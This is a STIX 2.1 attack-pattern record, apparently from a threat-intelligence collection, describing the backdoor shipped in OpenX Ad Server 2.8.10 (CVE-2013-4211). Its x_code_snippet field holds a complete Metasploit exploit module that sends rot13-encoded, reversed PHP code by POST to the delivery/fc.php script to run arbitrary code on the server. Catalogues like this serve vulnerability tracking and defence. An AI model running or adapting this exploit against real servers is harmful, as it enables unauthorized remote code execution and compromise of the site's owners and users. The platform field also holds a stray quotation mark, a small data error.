{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e60cef7f-3713-4a9f-9d27-bdf976883323",
    "created": "2024-08-14T17:08:26.611482Z",
    "modified": "2024-08-14T17:08:26.611486Z",
    "name": "OpenX Backdoor PHP Code Execution",
    "description": " OpenX Ad Server version 2.8.10 was shipped with an obfuscated backdoor since at least November 2012 through August 2013. Exploitation is simple, requiring only a single request with a rot13'd and reversed payload. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/openx_backdoor_php.rb",
            "external_id": "openx_backdoor_php.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-4211"
        },
        {
            "source_name": "reference",
            "url": "http://www.heise.de/security/meldung/Achtung-Anzeigen-Server-OpenX-enthaelt-eine-Hintertuer-1929769.html"
        },
        {
            "source_name": "reference",
            "url": "http://forum.openx.org/index.php?showtopic=503521628"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'OpenX Backdoor PHP Code Execution',\n      'Description'    => %q{\n        OpenX Ad Server version 2.8.10 was shipped with an obfuscated\n        backdoor since at least November 2012 through August 2013.\n        Exploitation is simple, requiring only a single request with a\n        rot13'd and reversed payload.\n      },\n      'Author'         =>\n        [\n          'egypt',   # Metasploit module, shouts to bperry for hooking me up with the vuln software\n          'Unknown', # Someone planted this backdoor...\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     => [\n          [ 'CVE', '2013-4211' ],\n          [ 'OSVDB', '96073' ],\n          [ 'URL', 'http://www.heise.de/security/meldung/Achtung-Anzeigen-Server-OpenX-enthaelt-eine-Hintertuer-1929769.html'],\n          [ 'URL', 'http://forum.openx.org/index.php?showtopic=503521628'],\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          # Arbitrary big number. The payload gets sent as POST data, so\n          # really it's unlimited\n          'Space'       => 262144, # 256k\n        },\n      'DisclosureDate' => '2013-08-07',\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [[ 'Generic (PHP payload)', { }]],\n      'DefaultTarget' => 0))\n\n    register_options([\n      OptString.new('TARGETURI', [true, \"The URI to request\", \"/openx/\"]),\n    ])\n  end\n\n  def check\n    token = rand_text_alpha(20)\n    response = execute_php(\"echo '#{token} '.phpversion();die();\")\n\n    if response.nil?\n      CheckCode::Unknown\n    elsif response.body =~ /#{token} ((:?\\d\\.?)+)/\n      vprint_status(\"PHP Version #{$1}\")\n      return CheckCode::Vulnerable\n    end\n    return CheckCode::Safe\n  end\n\n  def exploit\n    execute_php(payload.encoded)\n\n    handler\n  end\n\n  def execute_php(php_code)\n    money = rot13(php_code.reverse)\n    begin\n      response = send_request_cgi( {\n        'method' => \"POST\",\n        'global' => true,\n        'uri'    => normalize_uri(target_uri.path,\"www\",\"delivery\",\"fc.php\"),\n        'vars_get' => {\n          'file_to_serve' => \"flowplayer/3.1.1/flowplayer-3.1.1.min.js\",\n          'script' => 'deliveryLog:vastServeVideoPlayer:player'\n        },\n        'vars_post' => {\n          'vastPlayer' => money\n        },\n      }, 0.1)\n    rescue ::Rex::ConnectionError => e\n      fail_with(Failure::Unreachable, e.message)\n    rescue ::OpenSSL::SSL::SSLError\n      fail_with(Failure::BadConfig, \"The target failed to negotiate SSL, is this really an SSL service?\")\n    end\n\n    response\n  end\n\n  def rot13(str)\n    str.tr! \"A-Za-z\", \"N-ZA-Mn-za-m\"\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-08-07",
    "x_mitre_platforms": [
        "php'"
    ]
}